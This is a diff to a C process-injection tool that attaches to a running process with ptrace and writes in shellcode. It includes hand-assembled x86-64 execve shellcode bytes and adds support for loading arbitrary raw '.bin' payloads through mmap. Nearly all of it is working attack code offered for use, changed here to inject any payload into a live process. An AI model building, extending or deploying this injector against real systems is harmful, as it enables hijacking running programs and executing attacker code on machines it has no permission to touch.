@@ -40,16 +40,19 @@
 #  include<stdio.h>
 #  define INFO "\033[32m[+]\033[0m"
 #  define ERR  "\033[31m[!]\033[0m"
-#  define HELP(X) printf("OPTIONS: %s [PID/PATH] [EXECUTABLE]\n", X); exit(1);
+#  define HELP(X) printf("OPTIONS: %s [PID/PATH] [EXECUTABLE/BIN]\n", X); exit(1);
 #endif
 
 #define __GNU_SOURCE
 
 #include<errno.h>
+#include<fcntl.h> /* open() */
 #include<stdlib.h>
 #include<string.h>
+#include<sys/mman.h> /* mmap() */
 #include<sys/ptrace.h> /* ptrace() */
 #include<sys/reg.h> /* EIP, RIP */
+#include<sys/stat.h> /* struct stat, fstat() */
 #include<sys/types.h> /* pid_t, size_t */
 #include<sys/wait.h> /* waitpid() */
 #include<unistd.h>
@@ -64,8 +67,8 @@
 static u_int8_t base_shellcode[] = {
   0x48, 0x31, 0xc0,                         // xor rax, rax
   0x48, 0x31, 0xff,                         // xor rdi, rdi
-  0x48, 0x31, 0xf6,                         // xor rsi, rsi
   0x48, 0x31, 0xd2,                         // xor rdx, rdx
+  0x52,                                     // push rdx
   0x48, 0x8d, 0x3d, 0x29, 0x10, 0x10, 0x10,	// lea rdi, [rip+0x10101029]
   0x48, 0x81, 0xef, 0x10, 0x10, 0x10, 0x10,	// sub rdi, 0x10101010
   0x57,                                     // push rdi
@@ -152,7 +155,7 @@ int main(int argc, char *argv[])
   #endif
 
   u_int8_t *shellcode;
-  size_t shellcode_size;
+  int shellcode_size;
 
   int ret; // to be used again and again
   pid_t pid;
@@ -164,18 +167,28 @@ int main(int argc, char *argv[])
 
   // handling argv[2] before argv[1]
 
-  shellcode_size = strlen(base_shellcode) + strlen(argv[2]) + 1;
+  if(!strcmp(get_file_ext(argv[2]), "bin"))
+  {
+    int fd = open(argv[2], O_RDONLY);
+
+    struct stat st;
+    fstat(fd, &st);
+    shellcode_size = st.st_size;
+
+    shellcode = (u_int8_t*)mmap(NULL, shellcode_size, PROT_READ, MAP_FILE | MAP_SHARED, fd, 0);
+  } else
+  {
+    shellcode_size = strlen(base_shellcode) + strlen(argv[2]) + 1;
+
+    shellcode = malloc(shellcode_size);
+    strcpy(shellcode, base_shellcode);
+    strcat(shellcode, argv[2]);
+    strcat(shellcode, "\0");
+  }
 
   #ifdef __DEBUG__
   printf("%s Shellcode size: %i\n", DEBUG, shellcode_size);
-  #endif
 
-  shellcode = malloc(shellcode_size);
-  strcpy(shellcode, base_shellcode);
-  strcat(shellcode, argv[2]);
-  strcat(shellcode, "\0");
-
-  #ifdef __DEBUG__
   printf("%s Shellcode: ", DEBUG);
   for(int i = 0; i < shellcode_size; i++)
   {
@@ -281,9 +294,6 @@ int main(int argc, char *argv[])
   {
     case SIGTRAP:
       printf("%s Shellcode seems to have executed.\n", INFO);
-      #ifdef __DEBUG__
-      printf("%s This could be a false positive.\n", DEBUG);
-      #endif
       break;
     case SIGSEGV:
       printf("%s Shellcode caused the program to segfault.\n", ERR);
